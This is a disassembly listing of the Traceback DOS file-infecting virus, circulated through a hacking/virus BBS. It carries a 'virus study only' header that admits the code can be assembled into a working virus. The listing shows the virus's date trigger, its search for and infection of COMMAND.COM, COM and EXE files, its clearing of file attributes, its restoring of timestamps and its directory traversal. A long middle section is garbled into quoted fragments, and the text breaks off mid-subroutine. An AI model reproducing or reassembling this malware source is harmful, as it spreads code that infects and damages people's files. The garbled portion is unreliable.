

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
      tracebck.lst    llo - Copyright S & S E		 Sourcer Listing v3.07     8-Jan-91   6:19 pm   Page 1

				;==========================================================================
				;==			        TRACEBCK			         ==
				;==      Created:   15-Jun-89					         ==
				;==      Version:						         ==
				;==      Code type: zero start					         ==
				;==      Passes:    9	       Analysis Options on: BIOQRSUW	         ==
				;==      Copyright S & S E					         ==
				;==========================================================================

     0000 .EB					DB	0EBH
     0001  2E					DB	2EH
     0002  90					DB	90H
     0003  FF					DB	0FFH
     0004  FB					DB	0FBH
     0005  00					DB	0
     0006  01					DB	1
     0007  BB					DB	0BBH
     0008  0C					DB	0CH
     0009  4D 00 00				DB	 4DH, 00H, 00H
     000C  00 EB 2E 90 FF FF			DB	 00H,0EBH, 2EH, 90H,0FFH,0FFH
     0012  6C 6C				DB	 6CH, 6CH
     0014  6F 20				DB	 6FH, 20H
     0016  2D 20				DB	 2DH, 20H
     0018  43 6F 70 79 72 69	COPYRIGHT	DB	'Copyright S & S E'	; Data table (indexed access)
										;  xref 8981:059B, 059E, 05AE
     001E  67 68 74 20 53 20
     0024  26 20 53 20 45
     0029  00					DB	0
     002A  001D[00]				DB	29 DUP (0)
     0047  50 4C 49 43				DB	 50H, 4CH, 49H, 43H
     004B  003C[00]				DB	60 DUP (0)
     0087  03 3F				DB	 03H, 3FH
     0089  0007[3F]				DB	7 DUP (3FH)
     0090  43 4F 4D 20 02 00			DB	 43H, 4FH, 4DH, 20H, 02H, 00H
     0096  00 00 63 3A 5C 6D			DB	 00H, 00H, 63H, 3AH, 5CH, 6DH
     009C  20 1A 00 AF 0A 95			DB	 20H, 1AH, 00H,0AFH, 0AH, 95H
     00A2  58 00 00				DB	 58H, 00H, 00H
     00A5  43 4F 4D 4D 41 4E			DB	'COMMAND.COM'
     00AB  44 2E 43 4F 4D
     00B0  00 00 00 01				DB	0, 0, 0, 1
     00B4  000B[3F]				DB	11 DUP (3FH)
     00BF  10 05				DB	 10H, 05H
     00C1  0007[00]				DB	7 DUP (0)
     00C8  20 E9 11 B5 12 F6			DB	 20H,0E9H, 11H,0B5H, 12H,0F6H
     00CE  48 02 00				DB	 48H, 02H, 00H
     00D1  43 41 54 2D 54 57			DB	'CAT-TWO.ARC'
     00D7  4F 2E 41 52 43
     00DC  00 00 00				DB	0, 0, 0
     00DF  00					DB	0
     00E0  EB 0A				DB	0EBH, 0AH
     00E2  02					DB	2
     00E3  02					DB	2
     00E4  20 00				DB	 20H, 00H
     00E6  B6 22				DB	0B6H, 22H
     00E8  74 11				DB	 74H, 11H
     00EA  EB 04				DB	0EBH, 04H
     00EC  17 0A				DB	 17H, 0AH
     00EE  00					DB	0
     00EF  00 00				DB	0, 0
     00F1  51 59				DB	 51H, 59H
     00F3  8B 0F				DB	 8BH, 0FH
     00F5  20 00 56 47 31			DB	 20H, 00H, 56H, 47H, 31H
                                                |-------------------------------------------
     -------------------------------------------| Entry Point
                                                |-------------------------------------------
     00FA .EB 02				JMP	SHORT LOC_3		; (00FE)
     00FC  F5 0B				DB	0F5H, 0BH
     00FE			LOC_3:						;  xref 8981:00FA
     00FE  E8 0671				CALL	SUB_17			; (0772)
     0101  E8 0628				CALL	SUB_15			; (072C)
     0104  B4 19				MOV	AH,19H
     0106  CD 21				INT	21H			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
     0108  89 B4 0151				MOV	DS:DATA_28E[SI],SI	; (01E0:0151=0F4EBH)
     010C  81 84 0151 0884			ADD	WORD PTR DS:DATA_28E[SI],884H	; (01E0:0151=0F4EBH)
     0112  8C 8C 0153				MOV	DS:DATA_29E[SI],CS	; (01E0:0153=0FC80H)
     0116  88 84 00E3				MOV	DS:DATA_24E[SI],AL	; (01E0:00E3=6)
     011A  E8 0508				CALL	SUB_10			; (0625)
     011D  8A 95 00E2				MOV	DL,DS:DATA_36E[DI]	; (2607:00E2=0FFH)
     0121  8C D8				MOV	AX,DS
     0123  0E					PUSH	CS
     0124  1F					POP	DS
     0125  75 13				JNZ	LOC_5			; Jump if not zero
     0127  C7 84 0151 0984			MOV	DATA_74[SI],984H	; (8981:0151=0F8CH)
     012D  89 84 0153				MOV	DATA_75[SI],AX		; (8981:0153=0AEBH)
     0131  80 FA FF				CMP	DL,0FFH
     0134  74 04				JE	LOC_5			; Jump if equal
     0136  B4 0E				MOV	AH,0EH
     0138  CD 21				INT	21H			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
     013A			LOC_5:						;  xref 8981:0125, 0134
     013A  C6 84 0872 80			MOV	BYTE PTR DATA_83[SI],80H	; (8981:0872=82H)
     013F  C7 84 00EF 0000			MOV	WORD PTR DS:DATA_67E[SI],0	; (8981:00EF=0)
     0145  B4 2A				MOV	AH,2AH			; '*'
     0147  CD 21				INT	21H			; DOS Services  ah=function 2Ah
										;  get date, cx=year, dx=mon/day
     0149  81 F9 07C4				CMP	CX,7C4H
     014D  7D 07				JGE	LOC_6			; Jump if > or =
     014F  EB 28				JMP	SHORT LOC_9		; (0179)
     0151  0F8C			DATA_74		DW	0F8CH			; Data table (indexed access)
										;  xref 8981:0127, 0193, 0323
     0153  0AEB			DATA_75		DW	0AEBH			; Data table (indexed access)
										;  xref 8981:012D, 0197, 0327
     0155  00			DATA_76		DB	0			; Data table (indexed access)
										;  xref 8981:023E, 027F, 04BF, 055B
     0156			LOC_6:						;  xref 8981:014D
     0156  7F 0F				JG	LOC_7			; Jump if >
     0158  80 FE 0C				CMP	DH,0CH
     015B  7C 1C				JL	LOC_9			; Jump if < 015d="" 80="" fa="" 05="" cmp="" dl,5="" 0160="" 7c="" 17="" jl="" loc_9="" ;="" jump="" if="">< 0162="" 80="" fa="" 1c="" cmp="" dl,1ch="" 0165="" 7c="" 0b="" jl="" loc_8="" ;="" jump="" if="">< 0167="" loc_7:="" ;="" xref="" 8981:0156="" 0167="" c7="" 84="" 0877="" ffdc="" mov="" data_84[si],0ffdch="" ;="" (8981:0877="0FFDCH)" 016d="" c6="" 84="" 0872="" 88="" mov="" byte="" ptr="" data_83[si],88h="" ;="" (8981:0872="82H)" 0172="" loc_8:="" ;="" xref="" 8981:0165="" 0172="" 80="" bc="" 0004="" f8="" cmp="" byte="" ptr="" ds:data_39e+1[si],0f8h="" ;="" (8981:0004="0FBH)" 0177="" 73="" 15="" jae="" loc_10="" ;="" jump="" if="" above="" or="0179" loc_9:="" ;="" xref="" 8981:014f,="" 015b,="" 0160,="" 020d="" 0179="" 2e:="" c6="" 84="" 00ee="" 00="" mov="" byte="" ptr="" cs:data_66e[si],0="" ;="" (8981:00ee="0)" 017f="" e9="" 0195="" jmp="" loc_27="" ;="" (0317)="" 0182="" 80="" bc="" 0004="" f8="" cmp="" byte="" ptr="" ds:data_39e+1[si],0f8h="" ;="" (8981:0004="0FBH)" 0187="" 73="" 05="" jae="" loc_10="" ;="" jump="" if="" above="" or="0189" 80="" 8c="" 0872="" 04="" or="" byte="" ptr="" data_83[si],4="" ;="" (8981:0872="82H)" 018e="" loc_10:="" ;="" xref="" 8981:0177,="" 0187="" 018e="" c6="" 84="" 00df="" 00="" mov="" byte="" ptr="" ds:data_57e[si],0="" ;="" (8981:00df="0)" 0193="" 8b="" 94="" 0151="" mov="" dx,data_74[si]="" ;="" (8981:0151="0F8CH)" 0197="" 8e="" 9c="" 0153="" mov="" ds,data_75[si]="" ;="" (8981:0153="0AEBH)" 019b="" b8="" 4300="" mov="" ax,4300h="" 019e="" e8="" 014c="" call="" sub_1="" ;="" (02ed)="" 01a1="" 72="" 44="" jc="" loc_11="" ;="" jump="" if="" carry="" set="" 01a3="" 2e:="" 89="" 8c="" 00f5="" mov="" cs:data_70e[si],cx="" ;="" (8981:00f5="20H)" 01a8="" 80="" e1="" fe="" and="" cl,0feh="" 01ab="" b8="" 4301="" mov="" ax,4301h="" 01ae="" e8="" 013c="" call="" sub_1="" ;="" (02ed)="" 01b1="" 72="" 34="" jc="" loc_11="" ;="" jump="" if="" carry="" set="" 01b3="" b8="" 3d02="" mov="" ax,3d02h="" 01b6="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 3dh="" ;="" open="" file,="" al="mode,name@ds:dx" 01b8="" 72="" 2d="" jc="" loc_11="" ;="" jump="" if="" carry="" set="" 01ba="" 0e="" push="" cs="" 01bb="" 1f="" pop="" ds="" 01bc="" 89="" 84="" 00ef="" mov="" ds:data_67e[si],ax="" ;="" (8981:00ef="0)" 01c0="" 8b="" d8="" mov="" bx,ax="" 01c2="" b8="" 5700="" mov="" ax,5700h="" 01c5="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 57h="" ;="" get/set="" file="" date="" &="" time="" 01c7="" 89="" 8c="" 00f1="" mov="" ds:data_68e[si],cx="" ;="" (8981:00f1="5951H)" 01cb="" 89="" 94="" 00f3="" mov="" ds:data_69e[si],dx="" ;="" (8981:00f3="0F8BH)" 01cf="" fe="" 8c="" 0004="" dec="" byte="" ptr="" ds:data_39e+1[si]="" ;="" (8981:0004="0FBH)" 01d3="" 8b="" 94="" 0880="" mov="" dx,data_85[si]="" ;="" (8981:0880="39H)" 01d7="" 8b="" 8c="" 0882="" mov="" cx,data_86[si]="" ;="" (8981:0882="0)" 01db="" 81="" c2="" 0004="" add="" dx,4="" 01df="" 83="" d1="" 00="" adc="" cx,0="" 01e2="" b8="" 4200="" mov="" ax,4200h="" 01e5="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 42h="" ;="" move="" file="" ptr,="" cx,dx="offset" 01e7="" loc_11:="" ;="" xref="" 8981:01a1,="" 01b1,="" 01b8="" 01e7="" 0e="" push="" cs="" 01e8="" 1f="" pop="" ds="" 01e9="" f6="" 84="" 0872="" 04="" test="" byte="" ptr="" data_83[si],4="" ;="" (8981:0872="82H)" 01ee="" 74="" 06="" jz="" loc_12="" ;="" jump="" if="" zero="" 01f0="" e8="" 01e3="" call="" sub_3="" ;="" (03d6)="" 01f3="" e9="" 0121="" jmp="" loc_27="" ;="" (0317)="" 01f6="" loc_12:="" ;="" xref="" 8981:01ee="" 01f6="" 32="" d2="" xor="" dl,dl="" ;="" zero="" register="" 01f8="" b4="" 47="" mov="" ah,47h="" ;="" 'g'="" 01fa="" 56="" push="" si="" 01fb="" 83="" c6="" 46="" add="" si,46h="" 01fe="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 47h="" ;="" get="" present="" dir,drive="" dl,1="a:" 0200="" 5e="" pop="" si="" 0201="" 80="" bc="" 00ee="" 00="" cmp="" byte="" ptr="" ds:data_66e[si],0="" ;="" (8981:00ee="0)" 0206="" 75="" 05="" jne="" loc_13="" ;="" jump="" if="" not="" equal="" 0208="" e8="" 00f0="" call="" sub_2="" ;="" (02fb)="" 020b="" 73="" 03="" jnc="" loc_14="" ;="" jump="" if="" carry="0" 020d="" loc_13:="" ;="" xref="" 8981:0206="" 020d="" e9="" ff69="" jmp="" loc_9="" ;="" (0179)="" 0210="" loc_14:="" ;="" xref="" 8981:020b,="" 02ea="" 0210="" 8b="" d6="" mov="" dx,si="" 0212="" 81="" c2="" 0087="" add="" dx,87h="" 0216="" b4="" 1a="" mov="" ah,1ah="" 0218="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 1ah="" ;="" set="" dta="" to="" ds:dx="" 021a="" c7="" 44="" 05="" 2e2a="" mov="" word="" ptr="" ds:data_41e[si],2e2ah="" ;="" (8981:0005="100H)" 021f="" c7="" 44="" 07="" 4f43="" mov="" word="" ptr="" ds:data_41e+2[si],4f43h="" ;="" (8981:0007="0CBBH)" 0224="" c7="" 44="" 09="" 004d="" mov="" word="" ptr="" ds:data_45e[si],4dh="" ;="" (8981:0009="4DH)" 0229="" b4="" 4e="" mov="" ah,4eh="" ;="" 'n'="" 022b="" 8b="" d6="" mov="" dx,si="" 022d="" 83="" c2="" 05="" add="" dx,5="" 0230="" loc_15:="" ;="" xref="" 8981:025e="" 0230="" b9="" 0020="" mov="" cx,20h="" 0233="" e8="" 00b7="" call="" sub_1="" ;="" (02ed)="" 0236="" 72="" 28="" jc="" loc_18="" ;="" jump="" if="" carry="" set="" 0238="" 8b="" d6="" mov="" dx,si="" 023a="" 81="" c2="" 00a5="" add="" dx,0a5h="" 023e="" c6="" 84="" 0155="" 00="" mov="" data_76[si],0="" ;="" (8981:0155="0)" 0243="" e8="" 01a6="" call="" sub_4="" ;="" (03ec)="" 0246="" 72="" 06="" jc="" loc_17="" ;="" jump="" if="" carry="" set="" 0248="" e8="" 018b="" call="" sub_3="" ;="" (03d6)="" 024b="" loc_16:="" ;="" xref="" 8981:0253="" 024b="" e9="" 00bd="" jmp="" loc_26="" ;="" (030b)="" 024e="" loc_17:="" ;="" xref="" 8981:0246="" 024e="" 80="" bc="" 00ee="" 00="" cmp="" byte="" ptr="" ds:data_19e[si],0="" ;="" (0000:00ee="79H)" 0253="" 75="" f6="" jne="" loc_16="" ;="" jump="" if="" not="" equal="" 0255="" 80="" bc="" 0155="" 00="" cmp="" byte="" ptr="" ds:data_20e[si],0="" ;="" (0000:0155="28H)" 025a="" 75="" 46="" jne="" loc_22="" ;="" jump="" if="" not="" equal="" 025c="" b4="" 4f="" mov="" ah,4fh="" ;="" 'o'="" 025e="" eb="" d0="" jmp="" short="" loc_15="" ;="" (0230)="" 0260="" loc_18:="" ;="" xref="" 8981:0236="" 0260="" c7="" 44="" 07="" 5845="" mov="" word="" ptr="" ds:data_3e[si],5845h="" ;="" (0000:0007="0C300H)" 0265="" c7="" 44="" 09="" 0045="" mov="" word="" ptr="" ds:data_4e[si],45h="" ;="" (0000:0009="0E2H)" 026a="" b4="" 4e="" mov="" ah,4eh="" ;="" 'n'="" 026c="" 8b="" d6="" mov="" dx,si="" 026e="" 83="" c2="" 05="" add="" dx,5="" 0271="" loc_19:="" ;="" xref="" 8981:02a0="" 0271="" b9="" 0020="" mov="" cx,20h="" 0274="" e8="" 0076="" call="" sub_1="" ;="" (02ed)="" 0277="" 72="" 29="" jc="" loc_22="" ;="" jump="" if="" carry="" set="" 0279="" 8b="" d6="" mov="" dx,si="" 027b="" 81="" c2="" 00a5="" add="" dx,0a5h="" 027f="" c6="" 84="" 0155="" 00="" mov="" data_76[si],0="" ;="" (8981:0155="0)" 0284="" e8="" 0165="" call="" sub_4="" ;="" (03ec)="" 0287="" 72="" 06="" jc="" loc_21="" ;="" jump="" if="" carry="" set="" 0289="" e8="" 014a="" call="" sub_3="" ;="" (03d6)="" 028c="" loc_20:="" ;="" xref="" 8981:0295="" 028c="" eb="" 7d="" jmp="" short="" loc_26="" ;="" (030b)="" 028e="" 90="" db="" 90h="" 028f="" loc_21:="" ;="" xref="" 8981:0287="" 028f="" 2e:="" 80="" bc="" 00ee="" 00="" cmp="" byte="" ptr="" cs:data_66e[si],0="" ;="" (8981:00ee="0)" 0295="" 75="" f5="" jne="" loc_20="" ;="" jump="" if="" not="" equal="" 0297="" 80="" bc="" 0155="" 00="" cmp="" byte="" ptr="" ds:data_20e[si],0="" ;="" (0000:0155="28H)" 029c="" 75="" 04="" jne="" loc_22="" ;="" jump="" if="" not="" equal="" 029e="" b4="" 4f="" mov="" ah,4fh="" ;="" 'o'="" 02a0="" eb="" cf="" jmp="" short="" loc_19="" ;="" (0271)="" 02a2="" loc_22:="" ;="" xref="" 8981:025a,="" 0277,="" 029c="" 02a2="" e8="" 0056="" call="" sub_2="" ;="" (02fb)="" 02a5="" 8b="" d6="" mov="" dx,si="" 02a7="" 81="" c2="" 00b3="" add="" dx,0b3h="" 02ab="" b4="" 1a="" mov="" ah,1ah="" 02ad="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 1ah="" ;="" set="" dta="" to="" ds:dx="" 02af="" loc_23:="" ;="" xref="" 8981:02db="" 02af="" b4="" 4f="" mov="" ah,4fh="" ;="" 'o'="" 02b1="" b9="" 0010="" mov="" cx,10h="" 02b4="" 80="" bc="" 00df="" 00="" cmp="" byte="" ptr="" ds:data_18e[si],0="" ;="" (0000:00df="2)" 02b9="" 75="" 16="" jne="" loc_24="" ;="" jump="" if="" not="" equal="" 02bb="" c6="" 84="" 00df="" 01="" mov="" byte="" ptr="" ds:data_18e[si],1="" ;="" (0000:00df="2)" 02c0="" c7="" 44="" 05="" 2e2a="" mov="" word="" ptr="" ds:data_2e[si],2e2ah="" ;="" (0000:0005="7007H)" 02c5="" c7="" 44="" 07="" 002a="" mov="" word="" ptr="" ds:data_3e[si],2ah="" ;="" (0000:0007="0C300H)" 02ca="" b4="" 4e="" mov="" ah,4eh="" ;="" 'n'="" 02cc="" 8b="" d6="" mov="" dx,si="" 02ce="" 83="" c2="" 05="" add="" dx,5="" 02d1="" loc_24:="" ;="" xref="" 8981:02b9="" 02d1="" e8="" 0019="" call="" sub_1="" ;="" (02ed)="" 02d4="" 72="" 35="" jc="" loc_26="" ;="" jump="" if="" carry="" set="" 02d6="" f6="" 84="" 00c8="" 10="" test="" byte="" ptr="" ds:data_17e[si],10h="" ;="" (0000:00c8="45H)" 02db="" 74="" d2="" jz="" loc_23="" ;="" jump="" if="" zero="" 02dd="" 8b="" d6="" mov="" dx,si="" 02df="" 81="" c2="" 00d1="" add="" dx,0d1h="" 02e3="" b4="" 3b="" mov="" ah,3bh="" ;="" ';'="" 02e5="" e8="" 0005="" call="" sub_1="" ;="" (02ed)="" 02e8="" 72="" 21="" jc="" loc_26="" ;="" jump="" if="" carry="" set="" 02ea="" e9="" ff23="" jmp="" loc_14="" ;="" (0210)="" ;="=========================================================================" ;="" subroutine="" ;="" called="" from:="" 8981:019e,="" 01ae,="" 0233,="" 0274,="" 02d1,="" 02e5,="" 0307="" ;="" 0428,="" 0439,="" 0441="" ;="=========================================================================" sub_1="" proc="" near="" 02ed="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 43h="" ;="" get/set="" file="" attrb,="" nam@ds:dx="" 02ef="" 72="" 09="" jc="" loc_ret_25="" ;="" jump="" if="" carry="" set="" 02f1="" 2e:="" f6="" 84="" 00ee="" ff="" test="" byte="" ptr="" cs:data_66e[si],0ffh="" ;="" (8981:00ee="0)" 02f7="" 74="" 01="" jz="" loc_ret_25="" ;="" jump="" if="" zero="" 02f9="" f9="" stc="" ;="" set="" carry="" flag="" 02fa="" loc_ret_25:="" ;="" xref="" 8981:02ef,="" 02f7="" 02fa="" c3="" retn="" sub_1="" endp="" ;="=========================================================================" ;="" subroutine="" ;="" called="" from:="" 8981:0208,="" 02a2,="" 030b="" ;="=========================================================================" sub_2="" proc="" near="" 02fb="" c7="" 44="" 05="" 005c="" mov="" word="" ptr="" ds:data_41e[si],5ch="" ;="" (8981:0005="100H)" 0300="" 8b="" d6="" mov="" dx,si="" 0302="" 83="" c2="" 05="" add="" dx,5="" 0305="" b4="" 3b="" mov="" ah,3bh="" ;="" ';'="" 0307="" e8="" ffe3="" call="" sub_1="" ;="" (02ed)="" 030a="" c3="" retn="" sub_2="" endp="" 030b="" loc_26:="" ;="" xref="" 8981:024b,="" 028c,="" 02d4,="" 02e8="" 030b="" e8="" ffed="" call="" sub_2="" ;="" (02fb)="" 030e="" 8b="" d6="" mov="" dx,si="" 0310="" 83="" c2="" 46="" add="" dx,46h="" 0313="" b4="" 3b="" mov="" ah,3bh="" ;="" ';'="" 0315="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 3bh="" ;="" set="" current="" dir,="" path="" @="" ds:dx="" 0317="" loc_27:="" ;="" xref="" 8981:017f,="" 01f3="" 0317="" 8b="" 9c="" 00ef="" mov="" bx,ds:data_67e[si]="" ;="" (8981:00ef="0)" 031b="" 0b="" db="" or="" bx,bx="" ;="" zero="" 031d="" 74="" 29="" jz="" loc_29="" ;="" jump="" if="" zero="" 031f="" 8b="" 8c="" 00f5="" mov="" cx,ds:data_70e[si]="" ;="" (8981:00f5="20H)" 0323="" 8b="" 94="" 0151="" mov="" dx,data_74[si]="" ;="" (8981:0151="0F8CH)" 0327="" 8e="" 9c="" 0153="" mov="" ds,data_75[si]="" ;="" (8981:0153="0AEBH)" 032b="" 83="" f9="" 20="" cmp="" cx,20h="" 032e="" 74="" 05="" je="" loc_28="" ;="" jump="" if="" equal="" 0330="" b8="" 4301="" mov="" ax,4301h="" 0333="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 43h="" ;="" get/set="" file="" attrb,="" nam@ds:dx="" 0335="" loc_28:="" ;="" xref="" 8981:032e="" 0335="" 0e="" push="" cs="" 0336="" 1f="" pop="" ds="" 0337="" 8b="" 8c="" 00f1="" mov="" cx,ds:data_68e[si]="" ;="" (8981:00f1="5951H)" 033b="" 8b="" 94="" 00f3="" mov="" dx,ds:data_69e[si]="" ;="" (8981:00f3="0F8BH)" 033f="" b8="" 5701="" mov="" ax,5701h="" 0342="" cd="" 21="" int="" 21h="" ;="" dos="" services="" ah="function" 57h="" ;="" get/set="" file="" date="" &="" time="" 0344="" b4="" 3e="" mov="" ah,3eh="" ;="" '="">'
     0346  CD 21				INT	21H			; DOS Services  ah=function 3Eh
										;  close file, bx=file handle
     0348			LOC_29:						;  xref 8981:031D
     0348  8A 94 00E3				MOV	DL,DS:DATA_60E[SI]	; (8981:00E3=2)
     034C  B4 0E				MOV	AH,0EH
     034E  CD 21				INT	21H			; DOS Services  ah=function 0Eh
										;  set default drive dl  (0=a:)
     0350  E8 03FE				CALL	SUB_16			; (0751)
     0353  58					POP	AX
     0354  89 84 00E0				MOV	DS:DATA_58E[SI],AX	; (8981:00E0=0AEBH)
     0358  80 7C 03 FF				CMP	BYTE PTR DS:DATA_39E[SI],0FFH	; (8981:0003=0FFH)
     035C  74 0B				JE	LOC_30			; Jump if equal
     035E  05 0010				ADD	AX,10H
     0361  01 44 02				ADD	WORD PTR DS:DATA_37E+1[SI],AX	; (8981:0002=0FF90H)
     0364  58					POP	AX
     0365  1F					POP	DS
     0366  2E: FF 2C				JMP	DWORD PTR CS:[SI]
     0369			LOC_30:						;  xref 8981:035C
     0369  E8 02B9				CALL	SUB_10			; (0625)
     036C  0E					PUSH	CS
     036D  1F					POP	DS
     036E  8B 04				MOV	AX,[SI]
     0370  A3 0100				MOV	WORD PTR DS:[100H],AX	; (8981:0100=0E806H)
     0373  8A 44 02				MOV	AL,BYTE PTR DS:DATA_37E+1[SI]	; (8981:0002=90H)
     0376  A2 0102				MOV	BYTE PTR DS:[102H],AL	; (8981:0102=28H)
     0379  74 36				JZ	LOC_31			; Jump if zero
     037B  8C DB				MOV	BX,DS
     037D  81 C3 01D0				ADD	BX,1D0H
     0381  8E C3				MOV	ES,BX
     0383  8B FE				MOV	DI,SI
     0385  8B D6				MOV	DX,SI
     0387  B9 0BFA				MOV	CX,0BFAH
     038A  E8 085C				CALL	SUB_21			; (0BE9)
     038D  8B CA				MOV	CX,DX
     038F  8B F2				MOV	SI,DX
     0391  4E					DEC	SI
     0392  8B FE				MOV	DI,SI
     0394  FD					STD				; Set direction flag
     0395  F3/ A4				REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
     0397  1E					PUSH	DS
     0398  07					POP	ES
     0399  BF 0100				MOV	DI,100H
     039C  8E DB				MOV	DS,BX
     039E  8B F2				MOV	SI,DX
     03A0  B9 0BFA				MOV	CX,0BFAH
     03A3  E8 0843				CALL	SUB_21			; (0BE9)
     03A6  BE 0100				MOV	SI,100H
     03A9  0E					PUSH	CS
     03AA  1F					POP	DS
     03AB  E8 02D6				CALL	SUB_13			; (0684)
     03AE  BA 01D0				MOV	DX,1D0H
     03B1			LOC_31:						;  xref 8981:0379
     03B1  8C CF				MOV	DI,CS
     03B3  03 FA				ADD	DI,DX
     03B5  C7 44 05 0100			MOV	WORD PTR DS:DATA_41E[SI],100H	; (8981:0005=100H)
     03BA  89 7C 07				MOV	WORD PTR DS:DATA_41E+2[SI],DI	; (8981:0007=0CBBH)
     03BD  58					POP	AX
     03BE  1F					POP	DS
     03BF  8E DF				MOV	DS,DI
     03C1  8E C7				MOV	ES,DI
     03C3  8E D7				MOV	SS,DI
     03C5  33 DB				XOR	BX,BX			; Zero register
     03C7  33 C9				XOR	CX,CX			; Zero register
     03C9  33 ED				XOR	BP,BP			; Zero register
     03CB  2E: FF 6C 05				JMP	DWORD PTR CS:DATA_41E[SI]	; (8981:0005=100H)
     03CF			LOC_32:						;  xref 8981:042B, 043C, 0444
     03CF  2E: C6 84 00EE 00			MOV	BYTE PTR CS:DATA_66E[SI],0	; (8981:00EE=0)
     03D5  C3					RETN

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:01F0, 0248, 0289
				;==========================================================================

				SUB_3		PROC	NEAR
     03D6  8B 9C 00EF				MOV	BX,DS:DATA_67E[SI]	; (8981:00EF=0)
     03DA  0B DB				OR	BX,BX			; Zero ?
     03DC  74 0D				JZ	LOC_RET_33		; Jump if zero
     03DE  8B D6				MOV	DX,SI
     03E0  81 C2 0004				ADD	DX,4
     03E4  B9 0001				MOV	CX,1
     03E7  B4 40				MOV	AH,40H			; '@'
     03E9  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx

     03EB			LOC_RET_33:					;  xref 8981:03DC
     03EB  C3					RETN
				SUB_3		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0243, 0284
				;==========================================================================

				SUB_4		PROC	NEAR
     03EC  52					PUSH	DX
     03ED  B4 19				MOV	AH,19H
     03EF  CD 21				INT	21H			; DOS Services  ah=function 19h
										;  get default drive al  (0=a:)
     03F1  04 41				ADD	AL,41H			; 'A'
     03F3  B4 3A				MOV	AH,3AH			; ':'
     03F5  89 84 0884				MOV	DATA_87[SI],AX		; (8981:0884=3A43H)
     03F9  C6 84 0886 5C			MOV	BYTE PTR DATA_88[SI],5CH	; (8981:0886=5CH) '\'
     03FE  56					PUSH	SI
     03FF  81 C6 0887				ADD	SI,887H
     0403  B4 47				MOV	AH,47H			; 'G'
     0405  8B FE				MOV	DI,SI
     0407  32 D2				XOR	DL,DL			; Zero register
     0409  CD 21				INT	21H			; DOS Services  ah=function 47h
										;  get present dir,drive dl,1=a:
     040B  5E					POP	SI
     040C  4F					DEC	DI
     040D			LOC_34:						;  xref 8981:0412
     040D  47					INC	DI
     040E  8A 05				MOV	AL,[DI]
     0410  0A C0				OR	AL,AL			; Zero ?
     0412  75 F9				JNZ	LOC_34			; Jump if not zero
     0414  5B					POP	BX
     0415  C6 05 5C				MOV	BYTE PTR [DI],5CH	; '\'
     0418  47					INC	DI
     0419  8B D3				MOV	DX,BX
     041B			LOC_35:						;  xref 8981:0423
     041B  8A 07				MOV	AL,[BX]
     041D  88 05				MOV	[DI],AL
     041F  43					INC	BX
     0420  47					INC	DI
     0421  0A C0				OR	AL,AL			; Zero ?
     0423  75 F6				JNZ	LOC_35			; Jump if not zero

				;==== External Entry into Subroutine ======================================
				;         Called from:	 8981:0835

				SUB_5:
     0425  B8 4300				MOV	AX,4300H
     0428  E8 FEC2				CALL	SUB_1			; (02ED)
     042B  72 A2				JC	LOC_32			; Jump if carry Set
     042D  2E: 89 8C 00E4			MOV	CS:DATA_61E[SI],CX	; (8981:00E4=20H)
     0432  81 E1 00FE				AND	CX,0FEH
     0436  B8 4301				MOV	AX,4301H
     0439  E8 FEB1				CALL	SUB_1			; (02ED)
     043C  72 91				JC	LOC_32			; Jump if carry Set
     043E  B8 3D02				MOV	AX,3D02H
     0441  E8 FEA9				CALL	SUB_1			; (02ED)
     0444  72 89				JC	LOC_32			; Jump if carry Set
     0446  8B D8				MOV	BX,AX
     0448  1E					PUSH	DS
     0449  52					PUSH	DX
     044A  E8 0027				CALL	SUB_6			; (0474)
     044D  5A					POP	DX
     044E  1F					POP	DS
     044F  9C					PUSHF				; Push flags
     0450  2E: 8B 8C 00E4			MOV	CX,CS:DATA_61E[SI]	; (8981:00E4=20H)
     0455  83 F9 20				CMP	CX,20H
     0458  74 05				JE	LOC_36			; Jump if equal
     045A  B8 4301				MOV	AX,4301H
     045D  CD 21				INT	21H			; DOS Services  ah=function 43h
										;  get/set file attrb, nam@ds:dx
     045F			LOC_36:						;  xref 8981:0458
     045F  2E: 8B 8C 00E6			MOV	CX,CS:DATA_62E[SI]	; (8981:00E6=22B6H)
     0464  2E: 8B 94 00E8			MOV	DX,CS:DATA_63E[SI]	; (8981:00E8=1174H)
     0469  B8 5701				MOV	AX,5701H
     046C  CD 21				INT	21H			; DOS Services  ah=function 57h
										;  get/set file date & time
     046E  B4 3E				MOV	AH,3EH			; '>'
     0470  CD 21				INT	21H			; DOS Services  ah=function 3Eh
										;  close file, bx=file handle
     0472  9D					POPF				; Pop flags
     0473  C3					RETN
				SUB_4		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:044A
